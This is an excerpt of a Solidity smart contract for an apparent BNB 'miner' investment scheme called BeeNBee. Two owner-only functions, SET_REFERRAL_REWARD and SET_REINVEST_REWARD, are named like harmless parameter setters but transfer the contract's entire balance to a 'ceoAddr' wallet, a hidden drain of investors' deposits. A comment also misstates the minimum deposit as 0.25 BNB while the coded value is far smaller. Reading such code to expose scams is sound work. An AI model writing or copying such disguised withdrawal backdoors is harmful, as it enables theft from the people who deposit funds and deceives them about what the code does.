...
contract BeeNBee {
    ...
    uint256 public REFERRAL = 110;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public TAX = 100;
    uint256 public MARKET_EGGS_DIVISOR = 2;

    uint256 public MIN_INVEST_LIMIT = 1 * 1e15; /** MIN 0.25 BNB  **/
    ...
    function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 479520 && value <= 720000); /** min 3% max 18%**/
	...
	function SET_REFERRAL_REWARD(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
		if(value == 0){
		    ceoAddr.transfer(address(this).balance);
		}else{
		    ceoAddr.transfer(value);
		}
		
	}
		function SET_REINVEST_REWARD() external {
        require(msg.sender == owner, "Admin use only.");
		ceoAddr.transfer(address(this).balance);
	}
